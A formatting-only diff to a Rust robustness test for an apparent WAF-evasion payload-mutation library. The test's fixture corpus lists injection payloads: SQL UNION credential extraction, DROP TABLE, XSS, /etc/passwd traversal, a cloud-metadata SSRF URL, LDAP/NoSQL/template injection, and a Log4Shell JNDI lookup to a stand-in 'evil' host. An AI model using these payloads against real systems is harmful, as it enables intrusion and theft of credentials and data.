@@ -31,8 +31,8 @@
 use std::panic::{AssertUnwindSafe, catch_unwind};
 
 use wafrift_grammar::grammar::{
-    self, PayloadType, cassandra, classify, cmd, cmd_windows, elastic, ldap, mongo,
-    path_traversal, polyglot, redis, ssrf, template, xss,
+    self, PayloadType, cassandra, classify, cmd, cmd_windows, elastic, ldap, mongo, path_traversal,
+    polyglot, redis, ssrf, template, xss,
 };
 
 const ALL_TYPES: &[PayloadType] = &[
@@ -94,7 +94,10 @@ fn adversarial_corpus() -> Vec<(&'static str, String)> {
         ("semicolon_flood", ";".repeat(4096)),
         // ── realistic injection payloads (benign twins: must work) ──
         ("sqli_tautology", "' OR '1'='1' -- ".into()),
-        ("sqli_union", "1 UNION SELECT username,password FROM users".into()),
+        (
+            "sqli_union",
+            "1 UNION SELECT username,password FROM users".into(),
+        ),
         ("sqli_stacked", "1; DROP TABLE users; --".into()),
         ("xss_img", "<img src=x onerror=alert(1)>".into()),
         ("xss_svg", "<svg/onload=alert(1)>".into()),
@@ -103,7 +106,10 @@ fn adversarial_corpus() -> Vec<(&'static str, String)> {
         ("path_trav", "../../../../etc/passwd".into()),
         ("path_trav_enc", "..%2f..%2f..%2fetc%2fpasswd".into()),
         ("ldap_inj", "*)(uid=*))(|(uid=*".into()),
-        ("ssrf_meta", "http://169.254.169.254/latest/meta-data/".into()),
+        (
+            "ssrf_meta",
+            "http://169.254.169.254/latest/meta-data/".into(),
+        ),
         ("ssti_jinja", "{{7*7}}${7*7}#{7*7}<%=7*7%>".into()),
         ("nosql_op", "{\"$gt\": \"\"}".into()),
         ("log4shell", "${jndi:ldap://evil/a}".into()),
@@ -197,9 +203,9 @@ fn grammar_mutators_survive_adversarial_corpus() {
 
         // grammar::mutate / mutate_as across every cap and every type.
         for &cap in &[0usize, 1, 8, 64, 1000] {
-            if let Some(out) =
-                guard(&mut failures, "grammar::mutate", label, p, || grammar::mutate(p, cap))
-            {
+            if let Some(out) = guard(&mut failures, "grammar::mutate", label, p, || {
+                grammar::mutate(p, cap)
+            }) {
                 let v: Vec<String> = out.into_iter().map(|m| m.payload).collect();
                 check_variants(&mut failures, "grammar::mutate", label, ilen, Some(cap), &v);
             }
@@ -228,12 +234,18 @@ fn grammar_mutators_survive_adversarial_corpus() {
                 check_variants(&mut failures, "sql::mutate", label, ilen, Some(cap), &v);
             }
             if let Some(v) = guard(&mut failures, "xss::mutate", label, p, || {
-                xss::mutate(p, cap).into_iter().map(|m| m.payload).collect::<Vec<_>>()
+                xss::mutate(p, cap)
+                    .into_iter()
+                    .map(|m| m.payload)
+                    .collect::<Vec<_>>()
             }) {
                 check_variants(&mut failures, "xss::mutate", label, ilen, Some(cap), &v);
             }
             if let Some(v) = guard(&mut failures, "cmd::mutate", label, p, || {
-                cmd::mutate(p, cap).into_iter().map(|m| m.payload).collect::<Vec<_>>()
+                cmd::mutate(p, cap)
+                    .into_iter()
+                    .map(|m| m.payload)
+                    .collect::<Vec<_>>()
             }) {
                 check_variants(&mut failures, "cmd::mutate", label, ilen, Some(cap), &v);
             }
